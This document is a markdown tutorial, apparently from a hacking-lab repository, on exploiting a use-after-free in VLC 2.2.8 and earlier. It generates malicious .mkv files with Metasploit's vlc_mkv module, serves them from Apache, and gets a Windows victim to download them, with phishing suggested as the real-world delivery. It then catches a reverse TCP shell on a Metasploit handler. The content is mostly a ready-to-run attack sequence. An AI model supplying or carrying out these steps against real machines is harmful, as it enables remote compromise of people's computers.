# Exploitation using VLC with .mkv files

We'll using the VLC media player to gain access to your computer. VideoLAN VLC <= v2.2.8 (32 and 64 bit) are vulnerable to a use-after-free vulnerability that exists in the parsing of MKV files.

## Tutorial Video

![Exe Attack](./images/exe_attack.png)

## Steps for exploiting using the VLC media player

### Step 1: Generating the exploited media files

On our attacking system, we'll be creating **.mkv** files using MSFconsole.

```bash
$ msfconsole
msf5 > use exploit/windows/fileformat/vlc_mkv
msf5 exploit(windows/fileformat/vlc_mkv)> set LHOST 192.168.1.26
msf5 exploit(windows/fileformat/vlc_mkv)> set LPORT 443
msf5 exploit(windows/fileformat/vlc_mkv)> run
msf5 exploit(windows/fileformat/vlc_mkv)> exit
```

### Step 2: Serving mkv files with apache server

We'll use an HTTP server to host our file, so all the victim has to do is connect to us, download the file, and run it. In the real world, this could be accomplished in any number of ways, including social engineering or a phishing attack. For now, though, we will keep it simple. First, we'll copy executable to `/var/www/html` than we'll start our apache server.

```bash
$ cp /root/.msf4/local/twcsqfto-part1.mkv /var/www/html/twcsqfto-part1.mkv
$ cp /root/.msf4/local/twcsqfto-part2.mkv /var/www/html/twcsqfto-part2.mkv
$ service apache2 start
```

### Step 3: Starting the x64 windows shell

On our attacking system, we'll now create a handler to accept incoming connections from our payload. We should ensure the IP and port are the same as used in previous steps:

```bash
$ service postgresql start
$ msfconsole
msf5 > use multi/handler
msf5 exploit(multi/handler)> set PAYLOAD windows/x64/shell/reverse_tcp
msf5 exploit(multi/handler)> set LHOST 192.168.1.26
msf5 exploit(multi/handler)> set LPORT 443
msf5 exploit(multi/handler)> exploit -j
```

So we have the reverse TCP handler listening on port 443 for any incoming connections. Now we just need to get the files we generated earlier onto the Windows 7 machine.

### Step 4: Downloading files on a victim's computer

On the target, browse to the URLs(`/twcsqfto-part1.mkv` & `/twcsqfto-part2.mkv`)  with the IP address of the attacking machine and download the file.

`http://192.168.1.26/twcsqfto-part1.mkv` && `http://192.168.1.26/twcsqfto-part2.mkv`

Then, simply save it and run it and we have a reverse connection to the Windows 7 machine from the Kali Linux command line.

### Step 5: Privilege Escalation

We have a  session established back on our handler. So we'll typing systeminfo to get victim system information.

```bash
C:/> systeminfo
```

### References

- `https://www.yeahhub.com/windows-10-exploitation-image-metasploit-framework-2018/`
- `https://www.youtube.com/watch?v=STZ3aZDR2uc`